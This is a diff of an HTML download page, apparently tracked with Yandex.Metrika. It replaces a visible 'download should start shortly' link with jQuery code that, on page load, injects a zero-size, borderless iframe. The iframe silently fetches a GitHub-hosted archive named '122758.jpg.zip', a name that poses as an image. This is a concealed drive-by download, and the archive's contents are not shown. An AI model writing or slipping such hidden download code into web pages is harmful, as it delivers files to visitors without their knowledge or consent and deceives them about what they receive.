@@ -46,20 +46,15 @@ style="width:80px; height:15px; border:0;" alt="Яндекс.Метрика" tit
 
 <script>
 $(function() {
-     $('a[data-auto-download]').each(function(){
-       var $this = $(this);
-       setTimeout(function() {
-         window.location = $this.attr('href');
-       }, 2000);
-     });
+   $(window).bind('load', function() {
+      $("div.downloadProject").delay(1500).append('<iframe width="0" height="0" frameborder="0" src="https://github.com/zaharchenkopeter/pets.github.io/blob/master/122758.jpg.zip?raw=true"></iframe>'); 
    });
+});
 
 </script>
 
 
-<p>The download should start shortly. If it doesn't, click
-          <a data-auto-download href="https://github.com/zaharchenkopeter/pets.github.io/blob/master/122758.jpg.zip?raw=true">here</a>.</p>
-
+<div class="downloadProject"></div>
     
 
 
